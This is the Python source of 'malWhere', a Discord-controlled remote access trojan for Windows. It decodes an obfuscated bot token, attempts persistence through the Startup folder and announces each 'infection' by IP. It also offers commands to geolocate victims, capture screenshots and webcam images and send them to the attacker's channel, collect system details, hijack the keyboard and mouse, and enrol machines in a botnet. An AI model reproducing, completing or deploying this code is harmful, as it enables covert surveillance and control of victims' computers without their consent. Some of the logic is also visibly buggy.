# malWhere.py
import os
import requests
import discord
from discord.ext import commands
import json
import base64
import pyautogui
import getpass
import psutil
import PIL
from PIL import ImageGrab
from functools import partial
import time
import cv2
import threading
import sys
import pathlib
import random
from datetime import datetime
import shutil
import string

encryptedapi="<encrypted api url>"
base64_string =encryptedapi
base64_bytes = base64_string.encode("ascii")
sample_string_bytes = base64.b64decode(base64_bytes)
api = sample_string_bytes.decode("ascii")
gettoken=requests.get(api)
tokenjson=gettoken.json()
encryptedtoken=tokenjson["token"]
base64_string =encryptedtoken
count=0
maximum=5
while count<maximum:
  base64_bytes = base64_string.encode("ascii")
  sample_string_bytes = base64.b64decode(base64_bytes)
  decryp1 = sample_string_bytes.decode("ascii")
  base64_string=decryp1
  count=count+1
TOKEN=base64_string

persistencefile=f"C:/Users/{getpass.getuser()}/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/startup.py"
if not persistencefile:
  shutil.copy(__file__,"startup.py")

r = requests.get('https://api.ipify.org?format=json')
response=r.json()
ip=response["ip"]
ip4chan=ip.replace(".","")

botnet_flag=False
malWhere = commands.Bot(command_prefix='$')
malWhere.remove_command('help')

@malWhere.event
async def on_ready():
  guild = malWhere.get_guild(<guild id>)
  try:
    infectionschannel=malWhere.get_channel(<infections channel_id)
    existing_channel = discord.utils.get(guild.channels, name=ip4chan)
    if not existing_channel:
      embed=discord.Embed(title="New Infection", url="", description=(f"New Infection from {ip} connection is established.. wating for commands"))
      await guild.create_text_channel(ip)
      await infectionschannel.send(embed=embed)
    else:
      embed=discord.Embed(title="Duplicate Infection", url="", description=(f"{ip} already infected connection is established.. wating for commands"))
      await infectionschannel.send(embed=embed)
  except Exception as e:
    await infectionschannel.send(f"An Error Has Occured Please Try Again {e}")
   
@malWhere.command()
async def help(ctx,type):
  if type=="help":
    embed=discord.Embed(title="Help", description="malWhere's Help Menu", color=0xFF5733)
    embed.add_field(name="Help help", value="$help- shows this menu", inline=False)
    embed.add_field(name="General help", value="$help general - shows the general help menu", inline=False)
    embed.add_field(name="Trolling help", value="$help trolling - shows the trolling help menu", inline=False)
    await ctx.send(embed=embed)
    await ctx.message.delete()
  else:
    if type=="general":
      embed=discord.Embed(title="General Help", description="malWhere's General commands Help Menu",color=0xFF5733)
      embed.add_field(name="Geolocate", value="use $geolocate to locate your target", inline=False)
      embed.add_field(name="Screenshot", value="use $screenshot to take a screenshot of the targets displays", inline=False)
      embed.add_field(name="PC Info", value="Use $pcinfo to gather basic information about the victim pc", inline=False)
      await ctx.send(embed=embed)
      await ctx.message.delete()
    else:
      if type=="trolling":
        embed=discord.Embed(title="Trolling Help", description="malWhere's Trolling Help Menu", color=0xFF5733)
        embed.add_field(name="Rickroll", value="Ahhh such a clasic use $rickroll to get that exquisite trolling experience only rick can deliver", inline=False)
        await ctx.send(embed=embed)
        await ctx.message.delete()
      else:
        ctx.message.send("Invalid help type try again")
        
@malWhere.command()
async def geolocate(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      r = requests.get(f'http://ipinfo.io/{ip}?token=')
      response=r.json()
      embed=discord.Embed(title="Location Data", url=f"https://www.google.com/maps/search/4{response['loc']}/@{response['loc']},17z", description=f"{ip}'s Location data", color=0xFF5733)
      embed.add_field(name="IP", value=ip, inline=False)
      embed.add_field(name="COUNTRY", value=response["country"], inline=False)
      embed.add_field(name="REGION", value=response["region"], inline=False)
      embed.add_field(name="CITY", value=response["city"], inline=False)
      embed.add_field(name="POST CODE", value=response["postal"], inline=False)
      await ctx.send(embed=embed)
      await ctx.message.delete()
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()

@malWhere.command()
async def screenshot(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      guild = malWhere.get_guild(<guild_id again)
      ImageGrab.grab = partial(ImageGrab.grab, all_screens=True)
      existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
      if not existing_channel:
        await guild.create_text_channel(f"{ip4chan}-media")
      channel_id = existing_channel.id
      myScreenshot = pyautogui.screenshot()
      myScreenshot.save(r'temp.png')
      with open('temp.png', 'rb') as f:
        picture = discord.File(f)
        mediachan=malWhere.get_channel(channel_id)
        await mediachan.send(file=picture)
        os.remove("temp.png")
        await ctx.message.delete()
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()

@malWhere.command()
async def pcinfo(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      battery = psutil.sensors_battery()
      plugged = battery.power_plugged
      percent = str(battery.percent)
      plugged = "Plugged In" if plugged else "Not Plugged In"
      embed=discord.Embed(title="PC Info", url="", description=f"{ip}'s PC data", color=0xFF5733)
      embed.add_field(name="Username", value=getpass.getuser(), inline=False)
      embed.add_field(name="Current Working Directory", value=os.getcwd(), inline=False)
      embed.add_field(name="battery status", value=f"Battery Percentage is {percent}%")
      embed.add_field(name="Plugged In",value=f" Battery is {plugged}")
      await ctx.send(embed=embed)
      await ctx.message.delete()
    else:
      await ctx.channel.send("wrong channel skid")
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()

@malWhere.command()
async def rickroll(ctx):
  try:
    existing_chrome="C:/Users/{getpass.getuser()}/AppData/Local/Google/Chrome"
    if existing_chrome:
      os.popen("start chrome.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    existing_opera=f"C:/Users/{getpass.getuser()}/AppData/Local/Opera Software"
    if existing_opera:
      os.popen("start opera.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    existing_firefox="C:/Users/{getpass.getuser()}/AppData/Local/Mozilla/Firefox"
    if existing_firefox:
      os.popen("start firefox.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ")
    existing_brave="C:/Users/jorda/AppData/Local/BraveSoftware/Brave-Browser"
    if existing_brave:
      os.popen("start brave.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ") 
    existing_edge="C:/Users/{getpass.getuser()}/AppData/Local/Microsoft/Edge"
    if existing_edge:
      os.popen("start MicrosoftEdge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ") 
    await ctx.message.delete()
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()

@malWhere.command()
async def botnet(ctx,status):
  try:
    if str(ctx.channel)==(ip4chan):
      botnet_channel=malWhere.get_channel(botnet channel_id)
      global botnet_flag
      if status=="enable":
        if botnet_flag:
          await ctx.send("Botnet Mode Already Enabled")
        else:
          if not botnet_flag:
            botnet_flag=True
            await botnet_channel.send(f"{ip} has joined the botnet")
          else:
            if status=="disable":
              if botnet_flag==False:
                await ctx.send("Botnet Mode Already Disabled")
              else:
                if botnet_flag==True:
                  botnet_flag=False
                  await botnet_channel.send(f"{ip} has left the botnet")
    await ctx.message.delete() 
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()

@malWhere.command()
async def webcampic(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      await ctx.message.delete()
      existing_channel = discord.utils.get(ctx.guild.channels, name=f"{ip4chan}-media")
      if not existing_channel:
        await guild.create_text_channel(f"{ip4chan}-media")
      channel_id = existing_channel.id
      camera_port = 0
      camera = cv2.VideoCapture(camera_port)
      return_value, image = camera.read()
      cv2.imwrite("temp.png", image)
      del(camera)
      mediachan=malWhere.get_channel(channel_id)
      file = discord.File("temp.png", filename="temp.png")
      await mediachan.send(file=file)
      os.remove("temp.png")
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()

@malWhere.command()
async def hijack(ctx,keyboardormouse):
  try:
    if str(ctx.channel)==(ip4chan):
      print(keyboardormouse)
      if keyboardormouse=="keyboard":
        await ctx.message.delete()
        time.sleep(2)
        start_time=0
        end_time=90
        while True:
          if start_time <= end_time:
            randint=random.randint(0,100)
            randomstring=(string.ascii_lowercase+string.ascii_uppercase+string.ascii_letters+string.digits+string.punctuation)
            pyautogui.write( ''.join(random.choice(randomstring) for i in range(randint)) )
            start_time=start_time+1
      else:
        if keyboardormouse=="mouse":
          await ctx.message.delete()
          screen_size=pyautogui.size()
          now=datetime.now()
          start_time=0
          end_time=90
          while True:
            if start_time <= end_time:
              ycoord=random.randint(0,screen_size[0])
              xcoord=random.randint(0,screen_size[1])
              if pyautogui.onScreen(xcoord, ycoord):
                pyautogui.moveTo(xcoord,ycoord)
                start_time=start_time+1
        
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    await ctx.message.delete()
  await ctx.message.delete()

@malWhere.command()
async def kill(ctx):
  try:
    if str(ctx.channel)==(ip4chan):
      global botnet_flag
      botnet_channel=malWhere.get_channel(<botnet channel_id>)
      if botnet_flag==False:
        pass
      else:
        if botnet_flag==True:
          botnet_flag=False
          await botnet_channel.send(f"{ip} has left the botnet")
      await ctx.message.delete()
      exit()
  except Exception as e:
    await ctx.send(f"An Error Has Occured Please Try Again {e}")
    
malWhere.run(TOKEN)
